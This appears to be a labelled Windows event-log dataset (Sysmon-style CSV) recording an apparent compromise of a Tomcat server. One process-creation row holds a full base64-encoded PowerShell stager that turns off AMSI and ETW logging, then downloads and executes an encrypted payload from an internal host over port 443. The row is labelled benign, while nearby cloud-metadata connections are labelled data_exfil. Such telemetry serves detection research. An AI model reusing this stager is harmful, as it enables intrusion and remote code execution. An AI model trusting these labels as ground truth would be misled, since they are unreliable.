timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:05.1230000Z,3,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,tcp,192.168.2.5,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:05.1350000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,tcp,169.254.169.254,NT AUTHORITY\SYSTEM,2,data_exfil,data_exfil
2022-05-13T08:54:06.4580000Z,12,C:\Windows\system32\svchost.exe,,,3012,HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4890000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,12,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4930000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5030000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5080000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.5130000Z,7,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.6900000Z,11,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,C:\ProgramData\Tomcat9\logs\vulnapp-2.14.0.log,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.4420000Z,22,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:05.7740000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,tcp,169.254.169.254,NT AUTHORITY\SYSTEM,2,data_exfil,data_exfil
2022-05-13T08:54:06.9230000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.0030000Z,12,C:\Windows\system32\svchost.exe,,,3608,HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\PushNotifications\Backup,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4510000Z,26,C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe,,,7716,C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4560000Z,11,C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe,,,7716,C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.4860000Z,5,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,7716,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:07.5060000Z,5,C:\Windows\System32\conhost.exe,,,11924,,,,NT AUTHORITY\SYSTEM,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,17,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4160000Z,18,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\Tomcat9.exe,,,3936,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4200000Z,1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABrAEEATQBnAEEAdQBBAEQARQBBAE4AZwBBADQAQQBDADQAQQBNAHcAQQB1AEEARABVAEEATwBnAEEAMABBAEQAUQBBAE0AdwBBAD0AJwApACkAKQA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBEAGUAZgBhAHUAbAB0AFcAZQBiAFAAcgBvAHgAeQA7ACQAdwBjAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AHQAZQBzACgAJwBYAGYAUwBWAEIAOwBbAEkASwAzAGUALQBnAHQAagBUACMAXgB6AEwANABEAF8APABFAC8ALgB2AHIAbwA9AE8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAGwAWAB4AGMAQgBkAD0AdgBxAHcAdQBpAG8AagBTAC8AUQBjAGUAaQBMAE4AZABIAFcAdABaAGcAeQBWACsARABwAFkAPQAiACkAOwAkAGQAYQB0AGEAPQAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABEAGEAdABhACgAJABzAGUAcgArACQAdAApADsAJABpAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAYQB0AGEAWwA0AC4ALgAkAGQAYQB0AGEALgBsAGUAbgBnAHQAaABdADsALQBqAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4210000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.4210000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5060000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5110000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5130000Z,1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:06.7860000Z,3,C:\ProgramData\chocolatey\lib\Tomcat\tools\apache-tomcat-9.0.62\bin\tomcat9.exe,,,3936,,tcp,192.168.3.5,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5110000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5160000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5260000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5260000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5260000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5310000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5360000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5360000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5360000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5510000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5510000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5560000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5610000Z,7,C:\Windows\System32\conhost.exe,,,11780,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.5760000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6660000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6710000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6810000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6910000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7070000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7070000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7160000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.6860000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7470000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:08.7470000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.7470000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:08.7310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
